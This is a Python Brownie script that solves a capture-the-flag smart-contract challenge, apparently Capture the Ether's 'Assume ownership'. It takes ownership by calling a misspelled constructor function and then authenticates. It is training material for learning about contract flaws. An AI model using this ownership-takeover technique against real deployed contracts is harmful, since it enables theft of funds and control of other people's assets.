from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import AssumeOwnershipChallenge

##########################################
# To complete this challenge, become the `owner`.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        assume_ownership = load_challenge(ContractObject=AssumeOwnershipChallenge, instance_key='assume_ownership')
    else:
        assume_ownership = deploy_locally(ContractObject=AssumeOwnershipChallenge, from_account=_from)
    
    # call wrongly named constructor function
    assume_ownership.AssumeOwmershipChallenge(_from)
    
    # call authenticate
    assume_ownership.authenticate(_from)

    # check if the challenge is complete
    result = assume_ownership.isComplete()
    print(result) 

    # return the result
    return result

def main():
    solve_challenge()
